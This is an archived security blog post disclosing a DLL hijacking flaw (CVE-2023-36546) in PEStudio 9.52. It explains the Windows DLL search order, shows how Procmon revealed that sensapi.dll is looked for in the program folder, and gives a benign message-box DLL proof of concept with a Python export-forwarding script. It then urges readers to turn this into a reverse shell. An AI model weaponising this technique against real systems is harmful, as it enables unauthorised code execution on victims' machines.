---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-06-19_dll-hijacking-finding-vulnerabilities-in-pestudio-952.md
original_filename: 2023-06-19_dll-hijacking-finding-vulnerabilities-in-pestudio-952.md
title: DLL Hijacking – Finding Vulnerabilities In pestudio 9.52
category: documents
detected_topics:
- access-control
- command-injection
- api-security
- mobile-security
- supply-chain
tags:
- imported
- documents
- access-control
- command-injection
- api-security
- mobile-security
- supply-chain
language: en
raw_sha256: 76890b3b0fcbae524997e20dcc68b2e7d9829a318cd70a46eb64b4d123691a0a
text_sha256: 9e79c820d61747fb1dcbae9b8d5423b3f895ab0b8c7f4e166abc7a32b5320d52
ingested_at: '2026-06-28T07:32:22Z'
sensitivity: unknown
redactions_applied: false
---

# DLL Hijacking – Finding Vulnerabilities In pestudio 9.52

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-06-19_dll-hijacking-finding-vulnerabilities-in-pestudio-952.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, api-security, mobile-security, supply-chain
- Ingested At: 2026-06-28T07:32:22Z
- Redactions Applied: False
- Raw SHA256: `76890b3b0fcbae524997e20dcc68b2e7d9829a318cd70a46eb64b4d123691a0a`
- Text SHA256: `9e79c820d61747fb1dcbae9b8d5423b3f895ab0b8c7f4e166abc7a32b5320d52`


## Content

---
title: "DLL Hijacking – Finding Vulnerabilities In pestudio 9.52"
page_title: "CVE-2023-36546 - DLL Hijacking in PEStudio 9.52"
url: "https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/"
final_url: "https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/"
authors: ["Matei Josephs"]
programs: ["pestudio"]
bugs: ["DLL Hijacking", "Local Privilege Escalation"]
publication_date: "2023-06-19"
added_date: "2023-06-27"
source: "pentester.land/writeups.json"
original_index: 1033
---

![](https://i0.wp.com/securitycafe.ro/wp-content/uploads/2023/06/dllhijacking.jpeg?fit=840%2C560&ssl=1)

# DLL Hijacking – Finding CVE-2023-36546 in PEStudio 9.52

[June 19, 2023](https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/ "9:30 am") [Matei Josephs](https://securitycafe.ro/author/gingermat/ "View all posts by Matei Josephs") [Ethical Hacking](https://securitycafe.ro/category/ethical-hacking/), [Operating systems](https://securitycafe.ro/category/operating-systems/), [Penetration Testing](https://securitycafe.ro/category/penetration-testing/), [Pentest techniques](https://securitycafe.ro/category/pentest-techniques/) [Leave a comment](https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/#respond)

Lately, I have reported multiple DLL Hijacking vulnerabilities. These are quite straightforward, yet quite impactful. Thus, I thought of sharing some theory as well as a practical example of DLL Hijacking (how exciting, right?). This is YADHA (Yet Another DLL Hijacking Article)!

  1. [DLL Hijacking Theory](https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/#setting-up-your-ios-device)
  1. [Let’s Look at the Win32 API LoadLibraryA Function](https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/#let-s-look-at-the-win32-api-loadlibrarya-function)
  2. [How to Find DLL Hijacking Vulnerabilities?](https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/#how-to-find-dll-hijacking-vulnerabilities)
  3. [Creating the Exploit](https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/#creating-the-exploit)
  4. [Impact](https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/#impact)

## DLL Hijacking Theory

In the simplest terms, DLL Hijacking, also known as DLL side-loading, is an attack that exploits the way Windows searches for and loads DLL files, allowing an attacker to replace a legitimate DLL with a malicious one, leading to unauthorized code execution. This can happen due to various reasons, such as:

  * Incorrect DLL search order: Windows searches for DLLs in specific locations, such as the current directory or system folders. If an application does not specify the DLL’s full path, an attacker can place a malicious DLL in a directory with higher search priority, leading to the hijacking.

  * Weak or missing DLL loading safeguards: Applications may not implement sufficient security measures to validate the integrity and authenticity of DLL files, making them susceptible to substitution by malicious counterparts.

### Let’s Look at the Win32 API LoadLibraryA Function

LoadLibraryA loads the specified module into the address space of the calling process. The specified module may cause other modules to be loaded (see <https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya>).

![](https://i0.wp.com/securitycafe.ro/wp-content/uploads/2023/06/image-2.png?resize=840%2C597&ssl=1)

The screenshot above, highlights the essence of the issue by noting that if the string specifies a full path, the function searches only that path for the module, however, if the string specifies a relative path or a module name without a path, the function uses a standard search strategy to find the module. This is interesting, because it highlights a neat fix to the DLL Hijacking issue – specifying full paths to the modules. 

This article (<https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-security>) gives us some more insight into the load order. Assuming safe DLL search mode is enabled and the application is not using an alternate search order, the system searches directories in the following order:

  1. The directory from which the application loaded.
  2. The system directory.
  3. The 16-bit system directory.
  4. The Windows directory.
  5. The current directory.
  6. The directories that are listed in the PATH environment variable.

In other words, if the DLL is located in the directory form which the application is loaded, the application will stop searching the other directories for the module. Thus, if we can write to the search directories, we can manipulate the DLLs which are loaded.

## How to Find DLL Hijacking Vulnerabilities?

Feel free to follow along with this section! 

Let’s take the example of PEStudio 9.52. We can download PEStudio 9.52 from the following link: <https://www.winitor.com/download2>. In order to find DLL Hijacking vulnerabilities, we will need Procmon – a fantastic utility which is part of Microsoft’s SysInternals Suite (<https://download.sysinternals.com/files/SysinternalsSuite.zip>).

With our vulnerable application (PEStudio 9.52) and our tools (SysInternals Suite) downloaded, we are ready to start! The first step is to run Procmon64.exe and set the following filters:

![](https://i0.wp.com/securitycafe.ro/wp-content/uploads/2023/06/image-3.png?resize=583%2C94&ssl=1)

We are looking for DLLs which are attempted to be loaded by pestudio.exe and are not found. Now that we started capturing using the filters above, we can start PEStudio. It isn’t long before we get the following results in Procmon:

![](https://i0.wp.com/securitycafe.ro/wp-content/uploads/2023/06/image-4.png?resize=840%2C134&ssl=1)

This indicates that the 6 DLLs are attempted to be loaded from the directory from which the application is loaded. Let’s take sensapi.dll as an example for further inspection – by changing the _Path ends with_ filter from “.dll” to “sensapi.dll”. We now find that pestudio.exe tries to load sensapi.dll from the directory from which the application is loaded, fails, and then loads it from System32.

![](https://i0.wp.com/securitycafe.ro/wp-content/uploads/2023/06/image-5.png?resize=840%2C173&ssl=1)

Thus, if we are able to write our own malicious version of sensapi.dll into the pestudio folder, we may be able to run arbitrary commands on the system. 

## Creating the Exploit

Let’s take the following Proof of Concept C code (dll_hijack.c):
  
  
  #include <windows.h>
  #pragma comment (lib, "user32.lib")
  
  BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
  switch (ul_reason_for_call)  {
  case DLL_PROCESS_ATTACH:
  MessageBox(
  NULL,
  "DLL Hijack!",
  "PoC",
  MB_OK
  );
  break;
  case DLL_PROCESS_DETACH:
  break;
  case DLL_THREAD_ATTACH:
  break;
  case DLL_THREAD_DETACH:
  break;
  }
  return TRUE;
  }

This piece of code should generate a message box. Of course, this is a benign PoC, however, the potential for malicious code is only limited by the attacker’s imagination. 

Let’s also create the following Python script (dll_def.py):
  
  
  import pefile
  import sys
  import os.path
  
  dll = pefile.PE(sys.argv[1])
  dll_basename = os.path.splitext(sys.argv[1])[0]
  
  try:
  with open(sys.argv[1].split("/")[-1].replace(".dll", ".def"), "w") as f:
  f.write("EXPORTS\n")
  for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
  if export.name:
  f.write('{}={}.{} @{}\n'.format(export.name.decode(), dll_basename, export.name.decode(), export.ordinal))
  except:
  print ("Failed to create .def file :(")
  else:
  print ("Successfully created .def file :)")

The Python script was inspired by <https://cocomelonc.github.io/pentest/2021/10/12/dll-hijacking-2.html>. The script enumerates the exported functions from a DLL. The reason for this will soon become clear.

We must first find the original DLL and transfer it to our attack box.

![](https://i0.wp.com/securitycafe.ro/wp-content/uploads/2023/06/image-6.png?resize=452%2C277&ssl=1)

Then, we must find the functions exported by the initial DLL and create a .def file using the Python scrip shared above. We must use this .def file when compiling our C PoC, because otherwise there is a chance that our DLL will not be loaded due to missing procedures or entry points. After cross compiling the DLL (we are creating a Windows-specific file on a Linux system), we must transfer the resulting DLL onto the Windows system.

![](https://i0.wp.com/securitycafe.ro/wp-content/uploads/2023/06/image-7.png?resize=597%2C425&ssl=1)

We then place poc.dll into the same folder as pestudio.exe and rename it to sensapi.dll. Now, when we run pestudio.exe, we see that our DLL was loaded and generated a message box. Once we click OK, pestudio runs normally.

![](https://i0.wp.com/securitycafe.ro/wp-content/uploads/2023/06/image-8.png?resize=838%2C393&ssl=1) ![](https://i0.wp.com/securitycafe.ro/wp-content/uploads/2023/06/image-9.png?resize=601%2C211&ssl=1)

## Impact

Generally speaking, DLL Hijacking can allow attackers to run arbitrary commands on the victim’s system. In some cases, DLL Hijacking is used for privilege escalation, however, this is not the case for PEStudio, because I don’t see any reason to run PEStudio as admin. Nevertheless, application developers should take security into account and provide full paths to loaded modules in order to avoid these types of attacks. I encourage you to try to exploit this vulnerability in PEStudio to cause a reverse shell or create a user, but also to try to find these types of vulnerabilities in other applications, as I get the sense that there are a lot more of them than reported.

![](https://i0.wp.com/securitycafe.ro/wp-content/uploads/2023/06/image-10.png?resize=770%2C139&ssl=1)

### Share this:

  * [ Share on Facebook (Opens in new window) Facebook ](https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/?share=facebook)
  * [ Share on X (Opens in new window) X ](https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/?share=twitter)
  * [ Share on LinkedIn (Opens in new window) LinkedIn ](https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/?share=linkedin)
  * [ Share on Reddit (Opens in new window) Reddit ](https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/?share=reddit)
  * 

### Like this:

Like Loading…

### _Related_

[CVE](https://securitycafe.ro/tag/cve/)[CVE-2023-36546](https://securitycafe.ro/tag/cve-2023-36546/)[DLL Hijacking](https://securitycafe.ro/tag/dll-hijacking/)[Penetration Testing](https://securitycafe.ro/tag/penetration-testing/)[pentesting](https://securitycafe.ro/tag/pentesting/)[PEStudio](https://securitycafe.ro/tag/pestudio/)[Windows vulnerabilities](https://securitycafe.ro/tag/windows-vulnerabilities/)

## Post navigation

[Previous Post: Mobile Pentesting 101 – How to Set Up Your iOS Environment](https://securitycafe.ro/2023/06/12/mobile-pentesting-101-how-to-set-up-your-ios-environment/)

[Next Post: Command and Control Frameworks: Metasploit and Havoc](https://securitycafe.ro/2023/07/03/command-and-control-frameworks-metasploit-and-havoc/)
